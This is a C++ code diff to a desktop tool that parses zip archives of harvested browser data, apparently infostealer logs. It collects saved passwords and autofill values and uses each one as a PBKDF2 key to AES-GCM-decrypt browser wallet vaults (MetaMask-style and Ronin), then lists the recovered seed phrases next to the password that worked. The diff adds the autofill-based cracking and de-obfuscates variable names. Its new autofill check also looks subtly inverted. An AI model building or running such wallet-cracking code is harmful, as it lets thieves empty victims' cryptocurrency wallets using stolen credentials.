@@ -707,7 +707,7 @@ private:
 		std::unique_ptr<wxZipEntry> ZipEntry;
 
 		std::map<wxString, wxTreeItemId> TreeItemIdsMap;
-		wxArrayString Passwords, Vaults;
+		wxArrayString Autofills, Passwords, Vaults;
 
 		wxFFileInputStream FileInputStream(Path);
 		wxZipInputStream ZipInputStream(FileInputStream);
@@ -738,7 +738,40 @@ private:
 			{
 				FilesTreeCtrl->AppendItem(CurrentTreeItemId, NextMutable);
 
-				if (!ZipEntryName.compare("Passwords.txt"))
+				if (!ZipEntryName.StartsWith("Autofills"))
+				{
+					wxMemoryOutputStream MemoryOutputStream(nullptr);
+					ZipInputStream.Read(MemoryOutputStream);
+
+					wxString MemoryOutputStreamString(static_cast<char*>(MemoryOutputStream.GetOutputStreamBuffer()->GetBufferStart()), MemoryOutputStream.GetOutputStreamBuffer()->GetBufferSize());
+
+					NextPosition = MemoryOutputStreamString.find("Value: ");
+
+					if (NextPosition != wxString::npos)
+					{
+						while (NextPosition != wxString::npos)
+						{
+							MemoryOutputStreamString = MemoryOutputStreamString.substr(NextPosition + 7);
+							const wxString Autofill = MemoryOutputStreamString.substr(0, MemoryOutputStreamString.find_first_of("\n\r"));
+
+							bool IsUniqueAutofill = true;
+							for (const wxString UniqueAutofill : Autofills)
+							{
+								if (Autofill == UniqueAutofill && IsUniqueAutofill)
+								{
+									IsUniqueAutofill = false;
+									break;
+								}
+							}
+
+							if (IsUniqueAutofill)
+								Autofills.push_back(Autofill);
+
+							NextPosition = MemoryOutputStreamString.find("Value: ");
+						}
+					}
+				}
+				else if (!ZipEntryName.compare("Passwords.txt"))
 				{
 					wxMemoryOutputStream MemoryOutputStream(nullptr);
 					ZipInputStream.Read(MemoryOutputStream);
@@ -802,17 +835,17 @@ private:
 						wxMemoryOutputStream MemoryOutputStream(nullptr);
 						ZipInputStream.Read(MemoryOutputStream);
 
-						wxString nwlfgeob(static_cast<char*>(MemoryOutputStream.GetOutputStreamBuffer()->GetBufferStart()), MemoryOutputStream.GetOutputStreamBuffer()->GetBufferSize());
+						wxString MemoryOutputStreamString(static_cast<char*>(MemoryOutputStream.GetOutputStreamBuffer()->GetBufferStart()), MemoryOutputStream.GetOutputStreamBuffer()->GetBufferSize());
 
-						NextPosition = nwlfgeob.find("\"vault\"");
+						NextPosition = MemoryOutputStreamString.find("\"vault\"");
 
 						if (NextPosition != wxString::npos)
 						{
 							while (NextPosition != wxString::npos)
 							{
-								nwlfgeob = nwlfgeob.substr(NextPosition + 9);
+								MemoryOutputStreamString = MemoryOutputStreamString.substr(NextPosition + 9);
 
-								wxString Vault = nwlfgeob.substr(0, nwlfgeob.find('}') + 1);
+								wxString Vault = MemoryOutputStreamString.substr(0, MemoryOutputStreamString.find('}') + 1);
 								Vault.erase(std::remove(Vault.begin(), Vault.end(), 10), Vault.end());
 								Vault.erase(std::remove(Vault.begin(), Vault.end(), 13), Vault.end());
 								Vault.erase(std::remove(Vault.begin(), Vault.end(), 92), Vault.end());
@@ -830,27 +863,27 @@ private:
 								if (IsUniqueVault)
 									Vaults.push_back(Vault);
 
-								NextPosition = nwlfgeob.find("\"vault\"");
+								NextPosition = MemoryOutputStreamString.find("\"vault\"");
 							}
 						}
 					}
 					else if (ZipEntryName.rfind("RoninWallet") != wxString::npos)
 					{
-						wxMemoryOutputStream kkcaneou(nullptr);
-						ZipInputStream.Read(kkcaneou);
+						wxMemoryOutputStream MemoryOutputStream(nullptr);
+						ZipInputStream.Read(MemoryOutputStream);
 
-						wxString cvodergc(static_cast<char*>(kkcaneou.GetOutputStreamBuffer()->GetBufferStart()), kkcaneou.GetOutputStreamBuffer()->GetBufferSize());
+						wxString MemoryOutputStreamString(static_cast<char*>(MemoryOutputStream.GetOutputStreamBuffer()->GetBufferStart()), MemoryOutputStream.GetOutputStreamBuffer()->GetBufferSize());
 
-						NextPosition = cvodergc.find("encryptedVault");
+						NextPosition = MemoryOutputStreamString.find("encryptedVault");
 
 						if (NextPosition != wxString::npos)
 						{
 							while (NextPosition != wxString::npos)
 							{
-								cvodergc = cvodergc.substr(NextPosition + 14);
-								cvodergc = cvodergc.substr(cvodergc.find('{'));
+								MemoryOutputStreamString = MemoryOutputStreamString.substr(NextPosition + 14);
+								MemoryOutputStreamString = MemoryOutputStreamString.substr(MemoryOutputStreamString.find('{'));
 
-								wxString Vault = cvodergc.substr(0, cvodergc.find('}') + 1);
+								wxString Vault = MemoryOutputStreamString.substr(0, MemoryOutputStreamString.find('}') + 1);
 								Vault.erase(std::remove(Vault.begin(), Vault.end(), 10), Vault.end());
 								Vault.erase(std::remove(Vault.begin(), Vault.end(), 13), Vault.end());
 								Vault.erase(std::remove(Vault.begin(), Vault.end(), 92), Vault.end());
@@ -868,7 +901,7 @@ private:
 								if (IsUniqueVault)
 									Vaults.push_back(Vault);
 
-								NextPosition = cvodergc.find("encryptedVault");
+								NextPosition = MemoryOutputStreamString.find("encryptedVault");
 							}
 						}
 					}
@@ -935,10 +968,46 @@ private:
 					if (IsUniqueMnemonic)
 					{
 						Mutex.lock();
-						long bepygong = WalletsListCtrl->InsertItem(WalletsListCtrl->GetItemCount(), Path);
+						long WalletsListCtrlItemIndex = WalletsListCtrl->InsertItem(WalletsListCtrl->GetItemCount(), Path);
 						Mutex.unlock();
-						WalletsListCtrl->SetItem(bepygong, 1, Mnemonic);
-						WalletsListCtrl->SetItem(bepygong, 2, Password);
+						WalletsListCtrl->SetItem(WalletsListCtrlItemIndex, 1, Mnemonic);
+						WalletsListCtrl->SetItem(WalletsListCtrlItemIndex, 2, Password);
+					}
+
+					break;
+				}
+			}
+
+			for (const wxString Autofill : Autofills)
+			{
+				auto Key = Mimaxue::Subtles::Key(Mimaxue::Subtles::KeyFormat::eRaw, (std::string)Autofill, Mimaxue::Subtles::KeyAlgorithm::ePBKDF2, Mimaxue::Base64::Decode(Salt->valuestring), 10000);
+				auto DecryptedVault = Mimaxue::AES::GCM::Decrypt(Mimaxue::Base64::Decode(Data->valuestring), Mimaxue::Base64::Decode(IV->valuestring), Key);
+
+				if (DecryptedVault)
+				{
+					DecryptedVault->erase(std::remove(DecryptedVault->begin(), DecryptedVault->end(), 92), DecryptedVault->end());
+					wxString Mnemonic = DecryptedVault->substr(DecryptedVault->find("mnemonic") + 11);
+					Mnemonic = Mnemonic.substr(0, Mnemonic.find('"'));
+
+					bool IsUniqueMnemonic = true;
+
+					const int WalletsListCtrlItemCount = WalletsListCtrl->GetItemCount();
+					for (int WalletsListCtrlItemIndex = 0; WalletsListCtrlItemIndex < WalletsListCtrlItemCount; WalletsListCtrlItemIndex++)
+					{
+						if (WalletsListCtrl->GetItemText(WalletsListCtrlItemIndex, 1) == Mnemonic)
+						{
+							IsUniqueMnemonic = false;
+							break;
+						}
+					}
+
+					if (IsUniqueMnemonic)
+					{
+						Mutex.lock();
+						long WalletsListCtrlItemIndex = WalletsListCtrl->InsertItem(WalletsListCtrl->GetItemCount(), Path);
+						Mutex.unlock();
+						WalletsListCtrl->SetItem(WalletsListCtrlItemIndex, 1, Mnemonic);
+						WalletsListCtrl->SetItem(WalletsListCtrlItemIndex, 2, Autofill);
 					}
 
 					break;
